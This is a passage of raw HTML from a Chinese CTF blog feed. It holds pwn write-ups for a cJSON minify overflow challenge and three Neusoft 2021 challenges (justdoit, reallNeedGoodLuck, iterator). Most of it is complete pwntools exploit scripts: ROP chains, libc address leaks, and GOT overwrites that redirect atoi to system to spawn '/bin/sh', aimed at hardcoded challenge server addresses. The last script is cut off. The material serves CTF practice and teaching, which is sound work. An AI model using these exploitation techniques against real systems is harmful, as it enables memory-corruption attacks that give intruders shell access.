 &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( *str_a1 &amp;&amp; *str_a1 != <span class="string">'\n'</span> )</span><br><span class="line">              ++str_a1;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = last;</span><br><span class="line">    *last = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后输出处理后，第二次输入的字符串的前8位。</p><h2 id="漏洞点与利用"><a href="#漏洞点与利用" class="headerlink" title="漏洞点与利用"></a>漏洞点与利用</h2><p>这里在<code>cJSON_Minify</code>函数中有个两个问题，第一个是越界(即<code>cJSON_Minify</code>第89-92行）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">    ++str_a1;</span><br><span class="line">  str_a1 += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当字符串中有<code>\*</code>开头时，会不断遍历剩下字符直到遇到<code>\x00</code>或<code>*/</code>。但这里没有写仔细，如果遇到<code>*/</code>最后<code>str_a1 += 2;</code>是合理的但是遇到的是<code>\x00</code></p><p>就有越界的风险。</p><p>第二个问题是在对一般字符处理时（即<code>cJSON_Minify</code>第81-84行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v14 &#x3D; str_a1++;</span><br><span class="line">v15 &#x3D; *v14;</span><br><span class="line">v16 &#x3D; last++;</span><br><span class="line">*v16 &#x3D; v15;</span><br></pre></td></tr></table></figure><p>在对正常字符处理时，<code>cJSON_Minify</code>函数<code>str_a1</code>处的数据放入<code>last</code>处，在正常情况下，str_a1的位置和last的位置是一样的。但是如果触发了问题一中的越界，那么<code>str_a1</code>指向我们字符串为<code>\x00</code>的位置还要+1的地方,而last处的还指向字符串的’/‘字符的位置。达成了，越界写。</p><p>就这个题目而言，如果我们输入的字符分别为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">”xxxxxxxx/*oooo“ <span class="comment">#第一次的字符串</span></span><br><span class="line"></span><br><span class="line">”<span class="number">1234567890</span>qqqq” <span class="comment">#第二次字符串，v6</span></span><br></pre></td></tr></table></figure><p>那么，在处理前栈上的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx&#x2F;*oooo&quot;</span><br><span class="line">0x7ffc7f8d67bf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67c0: &quot;1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>在处理后，第一次字符串中的<code>/*oooo\x00</code>被替换成了第二个字符串中同等长度的字符<code>12345678</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67c7: &quot;890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>同时，若在第二次字符中还有 <code>/*</code>则将会在再次触发上面的步骤。</p><p>经过测试后发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf： xxxxxxxxxxxx&#x2F;*   v6:1111&#x2F;*qqqqqqqq</span><br><span class="line"></span><br><span class="line">buf： xxxxx&#x2F;*1111111    v6: &#x2F;*qqqqqqqqqqqq</span><br></pre></td></tr></table></figure><p>正好4次输入正好可以泄露出flag。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/29 09:59:15</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./cJSON_PWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> Nonex</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">x=<span class="string">'s/*aaaaaaa'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=<span class="string">'/*'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'1111/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">x=<span class="string">'/*1111111'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记-信息收集"><a href="#后记-信息收集" class="headerlink" title="后记-信息收集"></a>后记-信息收集</h2><p>在查阅这个题资料时发现这原理是一个信息收集题，orw…</p><p>搜索程序的文件可以看一个github项目：</p><p><img src="image-20211231165136223.png" alt="image-20211231165136223"></p><p>这里就一个看到一个security报告。</p><p><img src="image-20211231165647957.png" alt="image-20211231165647957"></p><p>这里就提到<code>/*</code>的报告，链接<a href="https://github.com/DaveGamble/cJSON/issues/338" target="_blank" rel="noopener">https://github.com/DaveGamble/cJSON/issues/338</a></p><p><img src="image-20211231170448565.png" alt="image-20211231170448565"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个签到都这么有意思，其他题一定也都很有趣吧….</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末有事去了，等缓过来只搞个这个题的文件….</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>东软2021CTF--PWN--wp</title>
    <link href="lexsd6.github.io/2021/12/04/%E4%B8%9C%E8%BD%AF/"/>
    <id>lexsd6.github.io/2021/12/04/%E4%B8%9C%E8%BD%AF/</id>
    <published>2021-12-04T02:18:12.000Z</published>
    <updated>2021-12-10T13:59:17.572Z</updated>
    
    <content type="html"><![CDATA[<p>第一次吃到东软的瓜，虽然是大连东软的(老NSUer气抖冷)……<a id="more"></a></p><h3 id="justdoit"><a href="#justdoit" class="headerlink" title="justdoit"></a>justdoit</h3><p>经过动态gdb发现，如果我们通过栈溢出劫持<code>main</code>重新运行，那么第二次输入的将放在第一次输入数据的上方。这样通过两次合理输入构造，我们可控的输入空间扩大。就可以在泄露出libc的真实地址的同时，然后<code>mian</code>程序流中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7fffbfe39330 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7fffbfe39338 —▸ 0x404028 (read@got.plt) —▸ 0x7f7373e188b0 (read) ◂— mov    eax, dword ptr fs:[0x18]</span><br><span class="line">02:0010│     0x7fffbfe39340 —▸ 0x401030 (puts@plt) ◂— jmp    qword ptr [rip + 0x2fe2]</span><br><span class="line">03:0018│     0x7fffbfe39348 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">04:0020│     0x7fffbfe39350 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7fffbfe39358 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">06:0030│     0x7fffbfe39360 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">07:0038│     0x7fffbfe39368 ◂— 0x0</span><br></pre></td></tr></table></figure><p>再通过LibcSearcher 找到system 和 /bin/sh 的真实地址，然后构造rop链get shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffc354e6078 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7ffc354e6080 —▸ 0x7f6ad64b269b ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;</span><br><span class="line">02:0010│     0x7ffc354e6088 —▸ 0x7f6ad6372e10 (system) ◂— test   rdi, rdi</span><br><span class="line">03:0018│     0x7ffc354e6090 ◂— 0x0</span><br><span class="line">04:0020│     0x7ffc354e6098 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7ffc354e60a0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">06:0030│     0x7ffc354e60a8 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">07:0038│     0x7ffc354e60b0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 17:36:49</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./justdoit'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65004</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:        0x00007f459ba23210      0x00007f459ba04dc0</span></span><br><span class="line"><span class="comment">#0x404028 &lt;read@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#main  0x4011d5</span></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line"><span class="comment">#0x40123e</span></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(e.got[<span class="string">'read'</span>])+p64(e.sym[<span class="string">'puts'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="reallNeedGoodLuck"><a href="#reallNeedGoodLuck" class="headerlink" title="reallNeedGoodLuck"></a>reallNeedGoodLuck</h3><p>分析程序流发现，在进行任意地址覆盖写时。除了<code>exit</code>函数外的libc函数，都已经延迟绑定完毕。而我们只能覆盖4个字节，单纯操作难以直接修改任何libc为<code>system</code>，同时发现程序流有<code>exit</code>函数来控制结束 ,所以只能先覆盖exit函数来控制程序流。继续审计程序代码发现，在我们通过劫持 <code>exit</code> 函数再次进入程序流时   <code>init</code>函数作用可有可无，同时  <code>init</code>函数中的<code>setvbuf</code>函数不仅got地址可以被我们劫持,第一个参数<code>stdin</code>也受我们控制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0000000000401166                 public init</span><br><span class="line">.text:0000000000401166 init            proc near               ; CODE XREF: main+1C↓p</span><br><span class="line">.text:0000000000401166 ; __unwind &#123;</span><br><span class="line">.text:0000000000401166                 push    rbp</span><br><span class="line">.text:0000000000401167                 mov     rbp, rsp</span><br><span class="line">.text:000000000040116A                 mov     rax, cs:stdin@GLIBC_2_2_5  &#x2F;&#x2F; puts.got</span><br><span class="line">.text:0000000000401171                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401176                 mov     edx, 2          ; modes</span><br><span class="line">.text:000000000040117B                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000401180                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000401183                 call    _setvbuf&#x2F;&#x2F; puts</span><br><span class="line">.text:0000000000401188                 mov     rax, cs:__bss_start</span><br><span class="line">.text:000000000040118F                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401194                 mov     edx, 2          ; modes</span><br><span class="line">.text:0000000000401199                 mov     esi, 0          ; buf</span><br><span class="line">.text:000000000040119E                 mov     rdi, rax        ; stream</span><br><span class="line">.text:00000000004011A1                 call    _setvbuf</span><br><span class="line">.text:00000000004011A6                 nop</span><br><span class="line">.text:00000000004011A7                 pop     rbp</span><br><span class="line">.text:00000000004011A8                 retn</span><br><span class="line">.text:00000000004011A8 ; &#125; &#x2F;&#x2F; starts at 401166</span><br><span class="line">.text:00000000004011A8 init            endp</span><br></pre></td></tr></table></figure><p>因此我们先劫持<code>exit</code>让其跳转到执行完<code>init</code>函数处即<code>0x0000000004011CA</code>位置。然后修改<code>setvbuf</code>函数为<code>puts</code>函数。再将<code>stdin</code>地址改<code>puts</code> got 地址与劫持<code>exit</code>函数为完整<code>mian</code>函数来泄露出真实地址。(其实直接<code>stdin</code>,就可以泄露出，但本地环境中常泄露出截断符)</p><p>然后再将<code>atoi</code>函数劫持为<code>system</code>，再传入<code>/bin/sh\x00</code>即可以getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 14:33:30</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./reallNeedGoodLuck.1'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404038 &lt;exit@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404030 &lt;atoi@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00404100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,date)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'good'</span>)</span><br><span class="line">    p.send(p32(date))</span><br><span class="line">    p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">    p.sendline(str(addr))</span><br><span class="line"></span><br><span class="line">main_addr_a=<span class="number">0X0000000004011CA</span></span><br><span class="line">main_addr=<span class="number">0x0000000004011A9</span></span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr_a)</span><br><span class="line"><span class="comment">#00000000004011D4 </span></span><br><span class="line"><span class="comment">#0x00000000004012b3</span></span><br><span class="line"><span class="comment">#exit   0x404038</span></span><br><span class="line"></span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>],e.got[<span class="string">'puts'</span>])</span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>]+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>]),(e.plt[<span class="string">'puts'</span>]))</span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>] + <span class="number">4</span>),(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr)</span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.recvline()</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'puts'</span>,addr)</span><br><span class="line"><span class="comment">#edit(e.got['exit'],main_addr_a)</span></span><br><span class="line"></span><br><span class="line">p.send(p32(main_addr_a))</span><br><span class="line">p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x404038</span>))</span><br><span class="line"></span><br><span class="line">system_addr=x.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'atoi'</span>],u32(p64(system_addr)[:<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'/bin/sh\x00'</span>,main_addr_a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h3><p>在overwrite功能在修改变量大于原数量时，修改数据会越界。把下个chuck数据修改，加个PIE未开，可以劫持got表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/05 09:53:58</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./iterator'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65001</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   